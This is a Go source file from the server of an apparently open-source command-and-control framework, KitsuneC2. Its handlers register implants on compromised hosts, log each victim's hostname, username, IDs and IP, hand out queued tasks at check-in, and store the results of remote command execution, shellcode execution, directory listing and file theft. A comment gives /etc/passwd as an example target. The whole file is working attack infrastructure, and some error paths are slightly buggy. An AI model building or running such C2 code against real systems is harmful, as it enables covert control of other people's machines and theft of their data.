//This file contains all related functionality to handling incoming messages sent by implants.

package handlers

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/utils"
	"KitsuneC2/server/db"
	"KitsuneC2/server/transport"
	"encoding/json"
	"log"
	"net"
	"time"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
	communication.IMPLANT_REGISTER_REQ: handleImplantRegister,
	communication.IMPLANT_CHECKIN_REQ:  handleCheckin,
	communication.IMPLANT_ERROR_RESP:   handleImplantErrorResp,
	communication.IMPLANT_KILL_RESP:    handleImplantKillResp,
	communication.IMPLANT_CONFIG_RESP:  handleImplantConfigResp,
	//reserved for implant functionality
	communication.FILE_INFO_RESP:      handleFileInfoResp,
	communication.LS_RESP:             handleLsResp,
	communication.EXEC_RESP:           handleExecResp,
	communication.CD_RESP:             handleCdResp,
	communication.DOWNLOAD_RESP:       handleDownloadResp,
	communication.UPLOAD_RESP:         handleUploadResp,
	communication.SHELLCODE_EXEC_RESP: handleShellcodeExecResp,
}

// This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
// done.
func TcpHandler(conn net.Conn) {
	defer conn.Close()
	messageType, data, session, err := transport.ReceiveEnvelopeFromImplant(conn)
	if err != nil {
		log.Printf("[ERROR] handlers: Could not understand message sent by implant. Reason: %s", err.Error())
		return
	}

	handlerFunc := messageTypeToFunc[messageType]

	handlerFunc(session, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(sess *transport.Session, data interface{}) {
	implantRegister, ok := data.(*communication.ImplantRegisterReq)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant register message.")

	var dbEntry *db.Implant_info = new(db.Implant_info)
	dbEntry.Id = implantRegister.ImplantId
	dbEntry.Name = implantRegister.ImplantName
	dbEntry.Hostname = implantRegister.Hostname
	dbEntry.Username = implantRegister.Username
	dbEntry.Uid = implantRegister.UID
	dbEntry.Gid = implantRegister.GID
	dbEntry.Public_ip = sess.Connection.RemoteAddr().String()
	dbEntry.Last_checkin = time.Now().Unix()
	dbEntry.Os = implantRegister.Os
	dbEntry.Arch = implantRegister.Arch
	dbEntry.Active = true

	_, err := db.GetImplantInfo(dbEntry.Id) //before adding implant registry, check if it already exists (e.g. after re-launching implant)
	if err == db.ErrNoResults {             //if it doesn't exist, add the implant
		err = db.AddImplant(dbEntry)
		if err != nil {
			log.Printf("[ERROR] handlers: Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
			return
		}
		log.Printf("[INFO] handlers: Registered implant with ID: %s", implantRegister.ImplantId)
	} else if err == nil { //if it does exist, change the active status of the implant to true
		err = db.SetImplantStatus(dbEntry.Id, true)
		if err != nil {
			log.Printf("[ERROR] handlers: Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
			return
		}
		log.Printf("[INFO] handlers: Known implant with ID: %s tried to register, changing status of implant to active.", implantRegister.ImplantId)
	} else { //unkown db error
		log.Printf("[ERROR] handlers: Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
		return
	}

	//let the implant know we successfully registered it.
	req := communication.ImplantRegisterResp{Success: true}
	err = transport.SendEnvelopeToImplant(sess, communication.IMPLANT_REGISTER_RESP, req)
	if err != nil {
		log.Printf("[ERROR] handlers: Could not send register confirmation to implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
		return
	}

	log.Printf("[INFO] handlers: Letting implant with ID: %s know that register was successful.", implantRegister.ImplantId)
}

// Handles envelopes with messageType==2. Every x amount of time, an implant sends a check-in message which this function handles.
// the "data" variable is a string with the ID of an implant.
func handleCheckin(sess *transport.Session, data interface{}) {
	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=2 (Checkin), but could not convert envelope data to Checkin datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant checkin message.")

	err := db.UpdateLastCheckin(implantCheckin.ImplantId, int(time.Now().Unix()))
	if err != nil {
		log.Printf("[ERROR] handlers: Could not update last checkin time of Implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
	}
	log.Printf("[INFO] handlers: Handling check-in from implant with ID: %s", implantCheckin.ImplantId)

	//The ImplantCheckinResp message is a special type of message in which we have to do some extra JSON marshalling. We create
	//an object containing 2 arrays. The first integer array contains the Tasktypes that we want the implant to perform. The
	//second 2d byte array contains the arguments for every task (byte[Tasknr][marshalled task arguments]). The implant will
	//unmarshal the 2d byte array based on the taskTypes provided in the first array.
	//Example: We want to send a FileInfoReq for /etc/passwd and /etc/hosts. We create 2 FileinfoReq objects containing all
	//necessary arguments {PathToFile: "/etc/passwd"} and {PathToFile: "/etc/passwd"} and its corresponding MessageType (11, 11).
	//The ImplantCheckinResp object will look as follows: {[11, 11], [0][json.Marshal(FileInfoReq1)]}
	//														.....	 [1][json.Marhsal(FileInfoReq2)]
	pendingTasks, err := db.GetTasksForImplant(implantCheckin.ImplantId, false)
	if err != nil {
		if err == db.ErrNoResults {
			log.Printf("[INFO] handlers: No pending tasks for implant with id: %s", implantCheckin.ImplantId)
		} else {
			log.Printf("[ERROR] handlers: Database error while fetching tasks for implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
		}
		return
	}
	req := new(communication.ImplantCheckinResp)
	req.TaskTypes = make([]int, len(pendingTasks))
	req.TaskArguments = make([][]byte, len(pendingTasks))
	for i := range pendingTasks {
		log.Printf("[INFO] handlers: Sending task with ID: %s to implant with ID: %s", pendingTasks[i].Task_id, implantCheckin.ImplantId)
		req.TaskTypes[i] = pendingTasks[i].Task_type
		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
	}

	transport.SendEnvelopeToImplant(sess, communication.IMPLANT_CHECKIN_RESP, req)
}

// Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
func handleImplantErrorResp(sess *transport.Session, data interface{}) {
	implantErrorResp, ok := data.(*communication.ImplantErrorResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=4 (ImplantErrorResp), but could not convert envelope data to ImplantErrorResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant error message.")

	marshalledRes, err := json.Marshal(implantErrorResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
	err = db.CompleteTask(implantErrorResp.TaskId, marshalledRes)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
}

// Handles enveloped with messageType==6. The implant send this message when the server requests it to terminate.
func handleImplantKillResp(sess *transport.Session, data interface{}) {
	implantKillResp, ok := data.(*communication.ImplantKillResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=6 (ImplantKillResp), but could not convert envelope data to ImplantKillResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant kill message.")

	marshalledResult, err := json.Marshal(implantKillResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantKillResp.TaskId, err.Error())
	}
	err = db.SetImplantStatus(implantKillResp.ImplantId, false)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to set status of implant with ID: %s to \"false\" Reason: %s", implantKillResp.ImplantId, err.Error())
	}
	err = db.CompleteTask(implantKillResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", implantKillResp.TaskId, err.Error())
	}
}

func handleImplantConfigResp(sess *transport.Session, data interface{}) {
	implantConfigResp, ok := data.(*communication.ImplantConfigResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=8 (ImplantConfigResp), but could not convert envelope data to ImplantConfigResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant config response message.")

	marshalledResult, err := json.Marshal(implantConfigResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantConfigResp.TaskId, err.Error())
	}
	err = db.CompleteTask(implantConfigResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", implantConfigResp.TaskId, err.Error())
	}
}

//---------------Begin module handlers--------------------

// Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(sess *transport.Session, data interface{}) {
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=12 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an implant file-info response message.")

	marshalledResult, err := json.Marshal(fileInfoResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
	err = db.CompleteTask(fileInfoResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==14. The implant sends this message when the server sends a ls request.
func handleLsResp(sess *transport.Session, data interface{}) {
	lsResp, ok := data.(*communication.LsResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle a ls response message.")

	marshalledResult, err := json.Marshal(lsResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", lsResp.TaskId, err.Error())
	}
	err = db.CompleteTask(lsResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", lsResp.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==16. The implant sends this message when the server sends an exec request.
func handleExecResp(sess *transport.Session, data interface{}) {
	execResp, ok := data.(*communication.ExecResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=16 (ExecResp), but could not convert envelope data to ExecResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle a exec response message.")

	marshalledResult, err := json.Marshal(execResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", execResp.TaskId, err.Error())
	}
	err = db.CompleteTask(execResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", execResp.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==18. The implant sends this message when the server sends a cd request.
func handleCdResp(sess *transport.Session, data interface{}) {
	cdResp, ok := data.(*communication.CdResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=18 (CdResp), but could not convert envelope data to CdResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle a cd response message.")

	marshalledResult, err := json.Marshal(cdResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", cdResp.TaskId, err.Error())
	}
	err = db.CompleteTask(cdResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", cdResp.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==20. The implant sends this message when the server sends a download request.
func handleDownloadResp(sess *transport.Session, data interface{}) {
	downloadResp, ok := data.(*communication.DownloadResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle a download response message.")

	downloadReqEntry, err := db.GetTask(downloadResp.TaskId)
	if err != nil {
		log.Printf("[ERROR] handlers: While handling a download response, could not find original task that caused this response. Offending task ID: %s", downloadResp.TaskId)
		dbEntry, _ := json.Marshal("Could not find original task corresponding to this result. Discarded result.")
		db.CompleteTask(downloadResp.TaskId, dbEntry)
		return
	}
	downloadReq := new(communication.DownloadReq)
	err = json.Unmarshal(downloadReqEntry.Task_data, downloadReq)
	if err != nil {
		log.Printf("[ERROR] handlers: Could not unmarshal task with ID: %s back into its original structure while handling a download request.", downloadResp.TaskId)
		dbEntry, _ := json.Marshal("Original task corresponding to this result was corrupted. Discarded result.")
		db.CompleteTask(downloadReq.TaskId, dbEntry)
		return
	}

	err = utils.WriteFile(downloadResp.Contents, downloadReq.Destination)
	if err != nil {
		log.Printf("[ERROR] Could not write downloaded file to destination: %s. Reason: %s", downloadReq.Destination, err.Error())
		dbEntry, _ := json.Marshal("Could not write downloaded file to intended destination. Check logs for more info.")
		db.CompleteTask(downloadReq.TaskId, dbEntry)
	}

	dbEntry, _ := json.Marshal("Wrote file to: " + downloadReq.Destination)
	err = db.CompleteTask(downloadReq.TaskId, dbEntry)
	if err != nil {
		log.Printf("[Error] could not set task with ID: %s to complete status. Reason: %s", downloadReq.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==22. The implant sends this message when the server sends a upload request.
func handleUploadResp(sess *transport.Session, data interface{}) {
	uploadResp, ok := data.(*communication.UploadResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=22 (UploadResp), but could not convert envelope data to UploadResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle an upload response message.")

	marshalledResult, err := json.Marshal(uploadResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", uploadResp.TaskId, err.Error())
	}
	err = db.CompleteTask(uploadResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", uploadResp.TaskId, err.Error())
	}
}

// Handles enveloped with messageType==24. The implant sends this message when the server sends a shellcode execute request.
func handleShellcodeExecResp(sess *transport.Session, data interface{}) {
	shellcodeExecResp, ok := data.(*communication.ShellcodeExecResp)
	if !ok {
		log.Printf("[ERROR] handlers: Received envelope with messageType=24 (ShellcodeExecResp), but could not convert envelope data to ShellcodeExecResp datastructure")
		return
	}
	log.Printf("[INFO] handlers: Attempting to handle a shellcode exec response message.")

	marshalledResult, err := json.Marshal(shellcodeExecResp)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to marshal result of task with ID: %s for storage in database. Reason: %s", shellcodeExecResp.TaskId, err.Error())
	}
	err = db.CompleteTask(shellcodeExecResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] handlers: Unable to store result of completed task with ID: %s. Reason: %s", shellcodeExecResp.TaskId, err.Error())
	}
}
